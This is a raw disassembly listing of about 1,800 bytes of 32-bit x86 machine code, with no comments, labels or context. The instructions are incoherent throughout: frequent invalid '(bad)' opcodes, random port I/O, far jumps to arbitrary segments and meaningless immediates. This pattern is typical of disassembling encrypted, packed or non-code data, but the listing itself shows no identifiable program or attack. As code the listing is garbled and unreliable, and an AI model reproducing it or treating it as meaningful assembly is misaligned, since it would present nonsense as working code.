  4168ad:	cmp    eax,DWORD PTR [ebp-0x45]
  4168b0:	mov    al,ds:0x82262114
  4168b5:	mov    ecx,0xa2a1d892
  4168ba:	das    
  4168bb:	rol    BYTE PTR [eax-0x185d8b83],0x78
  4168c2:	pop    edx
  4168c3:	pmulhw mm7,QWORD PTR [eax]
  4168c6:	xor    DWORD PTR ds:0x34ed5a3,ecx
  4168cc:	stos   DWORD PTR es:[edi],eax
  4168cd:	pop    edi
  4168ce:	out    0xf4,al
  4168d0:	cs pop ds
  4168d2:	and    eax,0xd2e078eb
  4168d7:	mov    al,0x7b
  4168d9:	mov    ds:0x74a710f5,al
  4168de:	pop    esp
  4168df:	scas   eax,DWORD PTR es:[edi]
  4168e0:	call   0xbb15c962
  4168e5:	jge    0x416946
  4168e7:	pop    ebp
  4168e8:	push   0xfb883685
  4168ed:	fwait
  4168ee:	inc    ebp
  4168ef:	dec    ebx
  4168f0:	or     edx,DWORD PTR [eax-0x3e35cf8]
  4168f6:	ss xchg edi,eax
  4168f8:	and    eax,0x4f71028b
  4168fd:	data16 aas 
  4168ff:	dec    edi
  416900:	out    0x54,eax
  416902:	pop    edi
  416903:	cmp    ah,ah
  416905:	mov    ebp,0x1050bb03
  41690a:	(bad)  
  41690b:	ins    BYTE PTR es:[edi],dx
  41690c:	cmp    al,0xa1
  41690e:	mov    al,al
  416910:	dec    edx
  416911:	stc    
  416912:	dec    esi
  416913:	and    BYTE PTR ds:0x5194b193,ch
  416919:	aaa    
  41691a:	mov    cl,BYTE PTR [edx-0x43b9a588]
  416920:	hlt    
  416921:	or     al,0xd0
  416923:	mov    cl,0x4
  416925:	std    
  416926:	fadd   QWORD PTR [ebx+0x79]
  416929:	dec    edi
  41692a:	ds repnz arpl dx,bp
  41692e:	sahf   
  41692f:	outs   dx,BYTE PTR ds:[esi]
  416930:	lds    ebp,FWORD PTR [edi]
  416932:	(bad)  
  416934:	xor    bh,0xc1
  416937:	int3   
  416938:	cmp    esp,DWORD PTR [esi]
  41693a:	ficomp DWORD PTR [eax]
  41693c:	dec    edx
  41693d:	sbb    DWORD PTR [ebx+0x27],0xffffffa6
  416941:	out    0x87,eax
  416943:	mov    cl,0xb5
  416945:	mov    dh,0xaa
  416947:	jmp    0x6e128f4d
  41694c:	xchg   esi,eax
  41694d:	xchg   edi,eax
  41694e:	xchg   ebx,eax
  41694f:	cli    
  416950:	pop    edi
  416951:	dec    ecx
  416952:	adc    al,0xb3
  416954:	jg     0x416925
  416956:	jecxz  0x416942
  416958:	sbb    eax,0xc240305d
  41695d:	shr    DWORD PTR [edi-0x63],0x78
  416961:	jb     0x41698a
  416963:	or     BYTE PTR [esi-0x1b],0x97
  416967:	(bad)  
  416968:	xor    eax,0xf3b060db
  41696d:	mov    edx,0x597fddb5
  416972:	neg    ecx
  416974:	ins    DWORD PTR es:[edi],dx
  416975:	stos   BYTE PTR es:[edi],al
  416976:	aam    0xf9
  416978:	push   edx
  416979:	xchg   ebx,eax
  41697a:	ss mov al,0xdf
  41697d:	adc    al,0x25
  41697f:	cs xchg ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	mov    DWORD PTR [edx+0x1fa5e1a1],ebp
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0xb70707e
  4169a0:	jmp    0x2b65:0x21c4a929
  4169a7:	pop    edi
  4169a8:	popa   
  4169a9:	aad    0xf3
  4169ab:	add    al,0x4
  4169ad:	inc    ebp
  4169ae:	pop    edi
  4169af:	mov    esi,esp
  4169b1:	outs   dx,BYTE PTR ds:[esi]
  4169b2:	fbstp  TBYTE PTR [ecx-0x3c]
  4169b5:	jmp    0xd4ec:0x5aae0b18
  4169bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169bd:	sahf   
  4169be:	ss addr16 push edx
  4169c1:	int3   
  4169c2:	pop    ss
  4169c3:	ins    BYTE PTR es:[edi],dx
  4169c4:	jo     0x416a1c
  4169c6:	add    al,0xf
  4169c8:	jg     0x416a30
  4169ca:	scas   al,BYTE PTR es:[edi]
  4169cb:	mov    ?,WORD PTR [eax-0x7d5e1f44]
  4169d1:	into   
  4169d2:	jnp    0x416a4d
  4169d4:	inc    esi
  4169d5:	rol    BYTE PTR [esi+eiz*8-0x15],1
  4169d9:	mov    bh,0x1b
  4169db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169dc:	fistp  DWORD PTR [ecx+0x4c]
  4169df:	inc    eax
  4169e0:	xlat   BYTE PTR ds:[ebx]
  4169e1:	call   0xf24e:0xb7227ec9
  4169e8:	jecxz  0x416a62
  4169ea:	mov    edx,0xfc8215a8
  4169ef:	add    al,0x60
  4169f1:	pop    edi
  4169f2:	sbb    DWORD PTR [edx-0x5076f727],eax
  4169f8:	(bad)  
  4169f9:	hlt    
  4169fa:	jge    0x416a76
  4169fc:	ss es push esp
  4169ff:	ss jns 0x416a1f
  416a02:	and    BYTE PTR [ecx-0x75],dl
  416a05:	loope  0x416a4c
  416a07:	mov    dl,0x3
  416a09:	jnp    0x416a61
  416a0b:	push   0x2b
  416a0d:	mov    dh,ch
  416a0f:	cld    
  416a10:	aad    0x59
  416a12:	mov    ds:0xefff3eaa,al
  416a17:	push   edi
  416a18:	add    esp,ebp
  416a1a:	xlat   BYTE PTR ds:[ebx]
  416a1b:	mov    cs,edi
  416a1d:	popf   
  416a1e:	jmp    0x670eb7be
  416a23:	mov    ah,ah
  416a25:	cdq    
  416a26:	or     al,BYTE PTR [esi-0x627130c8]
  416a2c:	push   0x3
  416a2e:	jl     0x4169c1
  416a30:	mov    dh,BYTE PTR [edx-0x510e535a]
  416a36:	mov    ah,0xa1
  416a38:	sub    BYTE PTR [eax+0x4e7f3efe],ah
  416a3e:	jmp    0x45fa:0x638a281
  416a45:	int3   
  416a46:	leave  
  416a47:	sub    ebx,DWORD PTR [esi+0x50]
  416a4a:	xlat   BYTE PTR ds:[ebx]
  416a4b:	inc    ebp
  416a4c:	(bad)  
  416a4d:	push   ebp
  416a4e:	jmp    0x5a49aa0b
  416a53:	stos   DWORD PTR es:[edi],eax
  416a54:	shr    DWORD PTR [ebx+0x48c82b3d],cl
  416a5a:	int    0xaa
  416a5c:	outs   dx,BYTE PTR ds:[esi]
  416a5d:	retf   
  416a5e:	add    al,0x36
  416a60:	mov    ah,0x21
  416a62:	fwait
  416a63:	(bad)  
  416a64:	mov    ds:0x6a8edfbd,eax
  416a69:	outs   dx,DWORD PTR ds:[esi]
  416a6a:	jo     0x416a8e
  416a6c:	dec    ecx
  416a6d:	add    al,0x15
  416a6f:	out    0xb0,eax
  416a71:	loop   0x416ae6
  416a73:	icebp  
  416a74:	pop    esp
  416a75:	aas    
  416a76:	sub    bl,bh
  416a78:	jp     0x416af2
  416a7a:	cmp    eax,0xebce2550
  416a7f:	gs dec esi
  416a81:	add    BYTE PTR [ebp+0x6b],0x7c
  416a85:	xchg   esi,eax
  416a86:	inc    ebx
  416a87:	sbb    esp,edi
  416a89:	ds int 0x96
  416a8c:	pop    es
  416a8d:	xor    DWORD PTR [eax+0x55],ebx
  416a90:	test   BYTE PTR [esp+eax*2+0x42],cl
  416a94:	(bad)  
  416a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a96:	and    BYTE PTR [eax],bh
  416a98:	pushf  
  416a99:	mov    ebx,DWORD PTR [esi]
  416a9b:	push   edx
  416a9c:	repz test al,0x6f
  416a9f:	cmp    bh,BYTE PTR [eax+0x124c3d76]
  416aa5:	or     ch,BYTE PTR [ebx-0x4806941f]
  416aab:	mov    edx,0x321e315a
  416ab0:	popa   
  416ab1:	adc    DWORD PTR [ecx+0x7c88d42e],ebp
  416ab7:	pusha  
  416ab8:	sahf   
  416ab9:	jo     0x416afb
  416abb:	sub    al,0xe4
  416abd:	mov    cl,0xa1
  416abf:	mov    dh,0x3e
  416ac1:	xor    ebp,DWORD PTR [edx-0x33]
  416ac4:	inc    esp
  416ac5:	shl    ebx,1
  416ac7:	pusha  
  416ac8:	repz sub edi,DWORD PTR [esi+ecx*4+0x4f]
  416acd:	rcl    DWORD PTR [edi*8-0x3ebc4985],0x3e
  416ad5:	mov    DWORD PTR [edx-0x43],eax
  416ad8:	inc    esp
  416ad9:	cmp    DWORD PTR [ebx-0x51],ebp
  416adc:	into   
  416add:	(bad)  
  416ade:	into   
  416adf:	cmp    BYTE PTR [ecx-0x5b],ch
  416ae2:	xchg   ebp,eax
  416ae3:	stos   BYTE PTR es:[edi],al
  416ae4:	sub    eax,0x6dd19ba4
  416ae9:	sub    al,0x28
  416aeb:	hlt    
  416aec:	inc    ecx
  416aed:	adc    eax,0xba629df4
  416af2:	ins    BYTE PTR es:[edi],dx
  416af3:	jecxz  0x416af8
  416af5:	or     BYTE PTR [edx-0x3c],0x7e
  416af9:	mov    ss,esi
  416afb:	popf   
  416afc:	push   eax
  416afd:	sbb    edi,DWORD PTR [edi+0x6e4032b2]
  416b03:	imul   edx,DWORD PTR [edx-0x46],0xffffffa0
  416b07:	out    0x0,al
  416b09:	sbb    DWORD PTR [ebx],0xd
  416b0c:	nop
  416b0d:	mov    esi,0x7278f910
  416b12:	pop    ss
  416b13:	out    0xdf,al
  416b15:	ret    0x73dc
  416b18:	mov    edx,DWORD PTR [esi]
  416b1a:	mov    edi,?
  416b1c:	ret    
  416b1d:	enter  0x2bc9,0xa7
  416b21:	or     bh,BYTE PTR fs:[ecx-0x14]
  416b25:	jmp    0xe552:0x3791ee1
  416b2c:	dec    esi
  416b2d:	out    dx,al
  416b2e:	cmp    BYTE PTR [edi],dh
  416b30:	adc    edx,DWORD PTR [ebx-0x20d4600b]
  416b36:	sbb    BYTE PTR [ebp+0x27],bl
  416b39:	cld    
  416b3a:	add    dl,BYTE PTR [edi-0x23abcbf]
  416b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b41:	mov    ebp,0xb2bb0993
  416b46:	retf   0x84ce
  416b49:	xchg   BYTE PTR [edx+0x56],ah
  416b4c:	daa    
  416b4d:	mov    cl,0x5b
  416b4f:	push   ecx
  416b50:	mov    DWORD PTR [eax+0x28],esi
  416b53:	inc    eax
  416b54:	fwait
  416b55:	pop    ss
  416b56:	mov    ds:0xcaaefaac,al
  416b5b:	push   edx
  416b5c:	push   ss
  416b5d:	cwde   
  416b5e:	and    esp,DWORD PTR [edi-0x42]
  416b61:	cmp    eax,0x8042a365
  416b66:	pop    eax
  416b67:	inc    eax
  416b68:	and    BYTE PTR [eax],0x4a
  416b6b:	test   eax,0x8852f455
  416b70:	in     al,0x2d
  416b72:	sbb    DWORD PTR [ebp-0x1340b5ec],esp
  416b78:	or     ecx,DWORD PTR [eax]
  416b7a:	shr    dl,0xa1
  416b7d:	fdivrp st(7),st
  416b7f:	sub    eax,0xa3babefd
  416b84:	pop    edi
  416b85:	inc    ecx
  416b86:	or     cl,dh
  416b88:	jno    0x416bf3
  416b8a:	mov    eax,ds:0x92246908
  416b8f:	fs popa 
  416b91:	call   FWORD PTR [esi]
  416b93:	(bad)  
  416b94:	mov    ebp,0x235e0ae2
  416b99:	dec    edx
  416b9a:	mov    ebx,0xb960bae8
  416b9f:	(bad)  
  416ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba1:	dec    ebp
  416ba2:	lahf   
  416ba3:	jecxz  0x416c16
  416ba5:	mov    cl,0xd7
  416ba7:	pop    ecx
  416ba8:	mov    cl,0x32
  416baa:	fcom   DWORD PTR [ecx+0x188c322]
  416bb0:	inc    eax
  416bb1:	cmp    BYTE PTR [ebx],dh
  416bb3:	imul   eax,DWORD PTR [edi],0x2de80402
  416bb9:	jne    0x416bf2
  416bbb:	jp     0x416b90
  416bbd:	mov    ebp,DWORD PTR [edx+0x48]
  416bc0:	sub    bh,cl
  416bc2:	sbb    ch,BYTE PTR [esi]
  416bc4:	inc    ecx
  416bc5:	jmp    0x2fd6:0xf06d3fe5
  416bcc:	popf   
  416bcd:	cli    
  416bce:	arpl   WORD PTR [eax+ebp*8-0x19],bx
  416bd2:	fcom   QWORD PTR [esi]
  416bd4:	pop    esp
  416bd5:	jbe    0x416c0e
  416bd7:	xor    BYTE PTR [ebx],cl
  416bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bda:	adc    DWORD PTR [edi+0x1ac1273a],ecx
  416be0:	push   es
  416be1:	adc    al,cl
  416be3:	sbb    eax,0x5f6d5a0b
  416be8:	inc    ecx
  416be9:	or     eax,0x4c448f88
  416bee:	jne    0x416c32
  416bf0:	stc    
  416bf1:	fstp   DWORD PTR [eax]
  416bf3:	jg     0x416c5c
  416bf5:	push   ss
  416bf6:	jbe    0x416be3
  416bf8:	adc    edi,DWORD PTR [edi+0x42e1d685]
  416bfe:	push   ss
  416bff:	sub    BYTE PTR [eax],dl
  416c01:	(bad)  
  416c02:	sub    DWORD PTR [edx-0x4],ebx
  416c05:	or     al,0xbf
  416c07:	sbb    ebx,DWORD PTR [edi]
  416c09:	lods   eax,DWORD PTR ds:[esi]
  416c0a:	je     0x416bb1
  416c0c:	mov    esi,0xa84353fe
  416c11:	out    0xf,eax
  416c13:	mov    ds:0xb68a940e,eax
  416c18:	out    0xb7,eax
  416c1a:	rcl    DWORD PTR [ecx],cl
  416c1c:	mov    DWORD PTR [eax],ecx
  416c1e:	add    eax,0x56debcd8
  416c23:	outs   dx,BYTE PTR ds:[esi]
  416c24:	inc    edx
  416c25:	ins    DWORD PTR es:[edi],dx
  416c26:	push   ds
  416c27:	das    
  416c28:	xchg   edi,eax
  416c29:	add    BYTE PTR [ecx],ah
  416c2b:	mov    cl,0x89
  416c2d:	adc    ebx,DWORD PTR [edx+0x63185a2d]
  416c33:	sbb    eax,0x9da170f4
  416c38:	xchg   ebx,eax
  416c39:	jl     0x416ca6
  416c3b:	xor    edi,esi
  416c3d:	jge    0x416cac
  416c3f:	mov    ecx,0x4a38fc95
  416c44:	shl    DWORD PTR [ebx-0x1eb1812e],1
  416c4a:	outs   dx,BYTE PTR ds:[esi]
  416c4b:	in     eax,0x9
  416c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c4e:	outs   dx,DWORD PTR ds:[esi]
  416c4f:	push   esp
  416c50:	inc    edi
  416c51:	mov    dl,0xe2
  416c53:	into   
  416c54:	jbe    0x416caf
  416c56:	cli    
  416c57:	bound  edi,QWORD PTR [ebp-0x2f]
  416c5a:	(bad)  
  416c5b:	fldenv [edx+eax*4-0x7b1442d]
  416c62:	xlat   BYTE PTR ds:[ebx]
  416c63:	sbb    esi,DWORD PTR ds:[esi+0x49]
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	xchg   edi,eax
  416c7c:	cmp    DWORD PTR [edi+0x7f1ceeca],edx
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416ce9
  416c88:	stos   DWORD PTR es:[edi],eax
  416c89:	icebp  
  416c8a:	mov    dh,0xbb
  416c8c:	jbe    0x416cf9
  416c8e:	aaa    
  416c8f:	inc    ebx
  416c90:	jle    0x416cd6
  416c92:	imul   ecx,DWORD PTR [edi],0xa4211931
  416c98:	imul   edx,ecx,0x4a
  416c9b:	cmp    esp,eax
  416c9d:	hlt    
  416c9e:	aad    0xbe
  416ca0:	lods   al,BYTE PTR ds:[esi]
  416ca1:	add    eax,0xb1194c79
  416ca6:	sub    al,0xfd
  416ca8:	rol    BYTE PTR ds:0x944b2a46,1
  416cae:	xchg   esi,eax
  416caf:	fldcw  WORD PTR [ecx-0x97b0354]
  416cb5:	pop    esp
  416cb6:	shr    DWORD PTR [ecx],0xdb
  416cb9:	mov    esp,0xf91bfc92
  416cbe:	enter  0x7912,0x9a
  416cc2:	mov    BYTE PTR [edx],dh
  416cc4:	test   eax,0xa114f220
  416cc9:	mov    edx,0xe4a52eec
  416cce:	jb     0x416cb1
  416cd0:	xor    DWORD PTR [ebp+eiz*2-0x1f],ebx
  416cd4:	dec    edi
  416cd5:	mov    bl,0x91
  416cd7:	and    ebp,edx
  416cd9:	repnz xor al,0xf3
  416cdc:	mov    eax,0xfc82abfb
  416ce1:	or     al,0xf
  416ce3:	fbld   TBYTE PTR [edx-0xc]
  416ce6:	retf   0xb7d6
  416ce9:	scas   al,BYTE PTR es:[edi]
  416cea:	cmp    DWORD PTR [esi-0x1e7600c1],esi
  416cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cf1:	retf   
  416cf2:	clc    
  416cf3:	clc    
  416cf4:	mov    ds:0xb8c82c6f,al
  416cf9:	outs   dx,BYTE PTR ds:[esi]
  416cfa:	pop    ebx
  416cfb:	int    0x8f
  416cfd:	mov    ebx,0x86fc036a
  416d02:	test   BYTE PTR [edx-0x2ad54a65],dl
  416d08:	sti    
  416d09:	sahf   
  416d0a:	mov    WORD PTR [eax-0x797107ee],ss
  416d10:	jo     0x416cf2
  416d12:	jb     0x416cc1
  416d14:	add    edx,DWORD PTR [eax+eax*2-0x15f1d82d]
  416d1b:	rol    DWORD PTR [ecx],cl
  416d1d:	or     dh,BYTE PTR [eax]
  416d1f:	mov    ebp,0xf267e92
  416d24:	jno    0x416d57
  416d26:	sbb    ch,BYTE PTR [esi+0x6c]
  416d29:	repz test DWORD PTR [ebx+0x75ac17f0],edx
  416d30:	mov    edi,0xa3b8720c
  416d35:	test   al,0x83
  416d37:	push   es
  416d38:	inc    edx
  416d39:	and    eax,0x9ec5acda
  416d3e:	push   ebx
  416d3f:	repz cwde 
  416d41:	in     al,0x46
  416d43:	jle    0x416d26
  416d45:	xchg   DWORD PTR [ebx],ebx
  416d47:	jo     0x416d62
  416d49:	fiadd  DWORD PTR [edi-0x2878fde5]
  416d4f:	or     eax,0x4eeeefc2
  416d54:	sub    esp,DWORD PTR [edx+0x3059950c]
  416d5a:	sbb    al,0x93
  416d5c:	dec    ebx
  416d5d:	idiv   BYTE PTR [ebp-0x47]
  416d60:	imul   ebx,DWORD PTR [edx+edi*1],0xc1da49f7
  416d67:	jmp    0x416d8a
  416d69:	aad    0xeb
  416d6b:	jl     0x416db2
  416d6d:	inc    edi
  416d6e:	out    0x98,al
  416d70:	out    0xeb,al
  416d72:	adc    al,0xa
  416d74:	out    0x65,al
  416d76:	cwde   
  416d77:	and    bh,BYTE PTR [ebx+0x3a]
  416d7a:	adc    DWORD PTR [ecx+0x79055d4a],edi
  416d80:	lock std 
  416d82:	jle    0x416d5b
  416d84:	shl    ecx,0x4e
  416d87:	lock mov eax,ds:0xcfe38e62
  416d8d:	pop    esp
  416d8e:	aas    
  416d8f:	cmp    eax,0xcd9225a4
  416d94:	push   0x65
  416d96:	(bad)  
  416d97:	stos   BYTE PTR es:[edi],al
  416d98:	pushf  
  416d99:	adc    dl,BYTE PTR [ebx+ecx*1-0x16ac8d78]
  416da0:	and    DWORD PTR [ecx-0xc76d589],0x7b
  416da7:	mov    WORD PTR [esi-0x65],?
  416daa:	or     BYTE PTR [ecx+edx*4-0x4f919898],0x74
  416db2:	imul   ecx,DWORD PTR [ebx],0x89514ca
  416db8:	or     DWORD PTR [edi+0x3a],ebp
  416dbb:	pop    edi
  416dbc:	jo     0x416ddd
  416dbe:	jmp    FWORD PTR [eax+0x25cf3546]
  416dc4:	stos   DWORD PTR es:[edi],eax
  416dc5:	bound  ebx,QWORD PTR [edi]
  416dc7:	es mov ch,0xbc
  416dca:	test   al,0xe5
  416dcc:	iret   
  416dcd:	pop    edx
  416dce:	je     0x416d8e
  416dd0:	popa   
  416dd1:	enter  0x2f8,0x72
  416dd5:	cmc    
  416dd6:	and    BYTE PTR [edx+0x7e00e684],dh
  416ddc:	dec    edx
  416ddd:	pop    ebx
  416dde:	ret    0x4c1c
  416de1:	leave  
  416de2:	dec    edx
  416de3:	rol    BYTE PTR [edx],0xe7
  416de6:	jg     0x416dd5
  416de8:	jp     0x416e32
  416dea:	push   ebx
  416deb:	fwait
  416dec:	loop   0x416dfb
  416dee:	cmp    DWORD PTR [ebx+0x1c],ebp
  416df1:	(bad)  
  416df2:	sbb    DWORD PTR ds:0x58a3e86b,esi
  416df8:	rol    DWORD PTR [ecx-0x4bfbc1],1
  416dfe:	jno    0x416e55
  416e00:	xor    BYTE PTR [ebx-0x2c],ah
  416e03:	add    eax,0x7dbb8109
  416e08:	mov    ebx,0x317b2dd
  416e0d:	or     eax,0x85317ed
  416e12:	out    dx,eax
  416e13:	pop    edi
  416e14:	adc    BYTE PTR [edx],cl
  416e16:	xor    ebp,edx
  416e18:	mov    dh,0x6c
  416e1a:	adc    BYTE PTR [ebx+ecx*8-0x7ae2296f],ch
  416e21:	or     DWORD PTR [ebp-0x47],eax
  416e24:	gs dec esi
  416e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e27:	jecxz  0x416e80
  416e29:	add    ebx,DWORD PTR [edi-0x3b82cecf]
  416e2f:	adc    esi,DWORD PTR ds:0x4bba2736
  416e35:	cmp    DWORD PTR [esi+0x1f],ecx
  416e38:	clc    
  416e39:	and    edi,DWORD PTR [ecx+0x54]
  416e3c:	xor    esp,0x8ad49afd
  416e42:	mov    ecx,0x6363363f
  416e47:	xor    BYTE PTR [eax-0x26fd091],ch
  416e4d:	mov    dh,0xa2
  416e4f:	inc    esi
  416e50:	test   BYTE PTR [esp+edx*1],al
  416e53:	dec    ecx
  416e54:	xor    esi,DWORD PTR [edi+0x32]
  416e57:	leave  
  416e58:	faddp  st(3),st
  416e5a:	cmp    bl,BYTE PTR [edi]
  416e5c:	cmc    
  416e5d:	xchg   edx,eax
  416e5e:	and    eax,DWORD PTR [ecx]
  416e60:	repz sbb BYTE PTR [ebp-0x1b],cl
  416e64:	test   BYTE PTR [ebx],dl
  416e66:	(bad)  
  416e67:	pop    edi
  416e68:	cmp    ah,0xe0
  416e6b:	lea    eax,[esi]
  416e6d:	xchg   DWORD PTR [eax+0x4ec7a7f2],ebp
  416e73:	sub    al,0x85
  416e75:	loope  0x416ef1
  416e77:	sbb    esp,DWORD PTR [ecx+0x49]
  416e7a:	pop    es
  416e7b:	dec    esi
  416e7c:	push   es
  416e7d:	push   esp
  416e7e:	jne    0x416e9e
  416e80:	call   0xc56e:0x678f4243
  416e87:	in     al,dx
  416e88:	(bad)  
  416e89:	aas    
  416e8a:	lahf   
  416e8b:	inc    ebp
  416e8c:	cmc    
  416e8d:	xor    eax,0x896ef105
  416e92:	(bad)  
  416e93:	sub    cl,BYTE PTR [ebx+0x69]
  416e96:	sbb    eax,0xc33dc8b7
  416e9b:	adc    bl,dl
  416e9d:	enter  0xc62d,0x78
  416ea1:	and    dh,ch
  416ea3:	fisttp WORD PTR gs:[ebx]
  416ea6:	fsubr  QWORD PTR ds:0xb2dfd240
  416eac:	adc    al,0x49
  416eae:	int    0xa8
  416eb0:	sub    BYTE PTR [ebp-0x68],dl
  416eb3:	mov    bl,0xf
  416eb5:	inc    eax
  416eb6:	pop    edi
  416eb7:	dec    eax
  416eb8:	push   edx
  416eb9:	(bad)  [edx-0x28]
  416ebc:	jp     0x416f03
  416ebe:	mov    eax,ds:0x9d57fb44
  416ec3:	retf   
  416ec4:	test   eax,0xbb6614ef
  416ec9:	ret    0x4610
  416ecc:	cmp    ecx,DWORD PTR [ecx+ebx*2]
  416ecf:	mov    edx,0x733d9480
  416ed4:	imul   ecx,eax,0xffffffc4
  416ed7:	ins    BYTE PTR es:[edi],dx
  416ed8:	lods   eax,DWORD PTR ds:[esi]
  416ed9:	xchg   DWORD PTR [ebp+0x43],ecx
  416edc:	mov    ds:0xc6a94114,al
  416ee1:	repnz mov cl,BYTE PTR [esi-0x3]
  416ee5:	das    
  416ee6:	ficom  DWORD PTR [edi+0x73]
  416ee9:	mov    esi,0xd185997e
  416eee:	stos   BYTE PTR es:[edi],al
  416eef:	or     BYTE PTR [ebx],ah
  416ef1:	xchg   esp,eax
  416ef2:	test   BYTE PTR [eax+eax*4+0x32],al
  416ef6:	pusha  
  416ef7:	arpl   WORD PTR [eax+esi*4],di
  416efa:	cmc    
  416efb:	or     al,0xd0
  416efd:	test   al,0x60
  416eff:	dec    DWORD PTR [eax]
  416f01:	push   0x0
  416f03:	xchg   edi,eax
  416f04:	xchg   BYTE PTR [ebx+0x478bcd28],cl
  416f0a:	arpl   WORD PTR [esi+0x6f548d27],dx
  416f10:	jbe    0x416f53
  416f12:	mov    ebx,DWORD PTR [edx-0x52]
  416f15:	sti    
  416f16:	mov    eax,ds:0x442c9efa
  416f1b:	sbb    esi,eax
  416f1d:	mov    ecx,0xc7e2c715
  416f22:	lea    esi,[eax]
  416f24:	mov    ecx,0xce6cccdd
  416f29:	shl    BYTE PTR [ecx-0x2b04b3ae],1
  416f2f:	xchg   esp,eax
  416f30:	loop   0x416f8a
  416f32:	mov    cl,0x3d
  416f34:	mov    bl,0x5d
  416f36:	inc    ebx
  416f37:	pop    ecx
  416f38:	inc    ecx
  416f39:	xor    DWORD PTR [ebp+eiz*1-0x18f9fbe6],esp
  416f40:	ficom  DWORD PTR [ebx-0xd]
  416f43:	mov    eax,0x3e84eb08
  416f48:	clc    
  416f49:	mov    esp,0x22647585
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	in     eax,0xdd
  416f6c:	pop    ds
  416f6d:	sti    
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0x3870707e
  416f77:	mov    ds,WORD PTR [edx+0x47274d3f]
  416f7d:	out    0x23,eax
  416f7f:	call   0xfe62c42d
  416f84:	int3   
  416f85:	retf   
  416f86:	dec    ecx
  416f87:	je     0x416f6d
  416f89:	leave  
  416f8a:	(bad)
  416f8d:	(bad)  
  416f8e:	cmc    
  416f8f:	sub    DWORD PTR [ebx],0x4e
  416f92:	dec    ecx
  416f93:	cdq    
  416f94:	push   ss
  416f95:	or     eax,0x2e05a48b
  416f9a:	popa   
  416f9b:	rcr    DWORD PTR [ecx],0x32
  416f9e:	(bad)  
  416f9f:	push   ss
  416fa0:	fdivr  DWORD PTR [edi+0x2389930f]
  416fa6:	xchg   dh,bl
  416fa8:	retf   0x83ec
  416fab:	sub    BYTE PTR [edx-0x68],dl
  416fae:	jecxz  0x41702a
  416fb0:	adc    edx,DWORD PTR [edi-0x3bb7950d]
  416fb6:	popf   
  416fb7:	js     0x416fa7
  416fb9:	xchg   esi,eax
  416fba:	inc    esi
  416fbb:	test   al,0x97
  416fbd:	push   eax
  416fbe:	sub    DWORD PTR ds:0x90e42c92,0x11
  416fc5:	ret    0xbd7c
  416fc8:	dec    eax
  416fc9:	ficom  DWORD PTR [ebx]
  416fcb:	cmp    edx,0xbf45b93b
  416fd1:	xchg   edx,eax
  416fd2:	inc    DWORD PTR [edx]
  416fd4:	jbe    0x417006
  416fd6:	test   DWORD PTR [esi+eax*1+0x38],eax
  416fda:	cmp    al,0x61
  416fdc:	jge    0x417036
  416fde:	xor    edx,ebx
  416fe0:	nop
  416fe1:	push   esp
  416fe2:	pop    ds
  416fe3:	repnz dec esp
  416fe5:	pop    esi
  416fe6:	push   0x1c
  416fe8:	stc    
  416fe9:	fist   WORD PTR [esi-0x7a]
  416fec:	rcl    bl,cl
  416fee:	adc    DWORD PTR [esi+0x14],esi
  416ff1:	push   ds
  416ff2:	xchg   esp,eax
  416ff3:	shl    dl,1
  416ff5:	cmp    al,0x15
  416ff7:	jns    0x41704d
  416ff9:	gs js  0x416f95
  416ffc:	pop    esi
  416ffd:	and    al,0x94
  416fff:	jns    0x416ffd
  417001:	push   0xffffff91
  417003:	push   ebx
  417004:	push   cs
  417005:	imul   edi,DWORD PTR [ebx+0x34],0xffffffef
  417009:	addr16 pop esp
  41700b:	rcr    DWORD PTR [ebx+ecx*2-0x76],1
  41700f:	scas   al,BYTE PTR es:[edi]
  417010:	xor    esi,DWORD PTR [ebp+0x4a]
  417013:	out    dx,al
  417014:	stos   BYTE PTR es:[edi],al
  417015:	adc    BYTE PTR [eax+0x12b0bdac],dl
  41701b:	out    0x5f,al
  41701d:	popa   
  41701e:	push   esi
  41701f:	xor    al,0x4
  417021:	loopne 0x41701a
  417023:	jo     0x416fd2
  417025:	bound  edx,QWORD PTR [edi+0x40]
  417028:	pop    esi
  417029:	shr    BYTE PTR [ebx+0x5c556eb9],1
  41702f:	cmp    eax,0xd179cf46
  417034:	jae    0x4170a6
  417036:	aad    0xf5
  417038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417039:	loop   0x417079
  41703b:	idiv   DWORD PTR [ebx-0x3b]
  41703e:	add    ebx,esp
  417040:	lds    edx,FWORD PTR [ecx]
  417042:	sahf   
  417043:	imul   ebx,edi,0x6d8e163
  417049:	sbb    esp,DWORD PTR [edx+0x3bf4c01c]
  41704f:	adc    edx,ebx
  417051:	jo     0x417033
  417053:	and    eax,0xcb3c9155
  417058:	dec    ebx
  417059:	in     al,dx
  41705a:	cmp    al,0x36
  41705c:	jb     0x417080
  41705e:	mov    dh,0x72
